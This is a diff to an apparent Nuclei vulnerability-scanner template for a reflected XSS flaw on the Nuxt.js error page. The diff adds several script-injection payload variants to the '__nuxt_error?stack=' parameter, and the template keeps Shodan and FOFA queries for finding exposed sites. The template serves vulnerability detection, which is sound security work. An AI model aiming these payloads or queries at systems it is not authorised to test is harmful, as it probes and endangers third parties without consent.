@@ -10,10 +10,17 @@ http:
     type: word
     words:
     - text/html
+  - negative: true
+    status:
+    - 404
+    type: status
   matchers-condition: and
   method: GET
   path:
   - '{{BaseURL}}/__nuxt_error?stack=%0A<script>alert(document.domain)</script>'
+  - '{{BaseURL}}/__nuxt_error?stack=%0D%0A<script>alert(document.domain)</script>'
+  - '{{BaseURL}}/__nuxt_error?stack=<script>alert(document.domain)</script>'
+  - '{{BaseURL}}/__nuxt_error?stack="><script>alert(document.domain)</script>'
 id: nuxt-js-xss
 info:
   author: DhiyaneshDK
@@ -23,7 +30,6 @@ info:
     '
   metadata:
     fofa-query: body="buildAssetsDir" && body="__nuxt"
-    max-request: 1
     shodan-query: html:"buildAssetsDir" "nuxt"
     verified: 'true'
   name: Error Page XSS - Nuxt.js
@@ -32,4 +38,4 @@ info:
   - https://bryces.io/blog/nuxt3
   - https://twitter.com/fofabot/status/1669339995780558849
   severity: medium
-  tags: huntr,xss,nuxtjs,error
+  tags: xss
